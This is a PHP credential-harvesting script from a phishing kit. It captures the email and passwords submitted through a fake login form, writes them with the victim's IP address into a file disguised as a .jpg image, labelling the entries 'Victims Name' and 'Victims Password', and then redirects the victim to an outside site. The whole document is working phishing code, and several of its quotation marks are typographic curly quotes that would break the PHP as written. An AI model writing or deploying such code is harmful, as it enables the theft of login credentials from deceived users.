<?php
$habbo = $_POST[‘email']; 
$password = $_POST[‘password'];
 
$password1 = $_POST['password1']; $ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen(“DAC189092019881999191919191mobeen.jpg", "a"); 
fwrite ($f, 'Victims Name: [<b><font color="#570000">'.$habbo.'</font></b>] Victims Password: [<b><font color="#57003A">'.$password.'</font></b>] Victims Password1: [<b><font color="#57003A">'.$password1.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>] By: [<b><font color="#005700"><a href="http://www.fb.com/mobeendotcom" rel="nofollow">Bee Hay</a></font></b>]<br>');
fclose($f);
header("Location:http://ujpah.in/pdf/acessos");
?>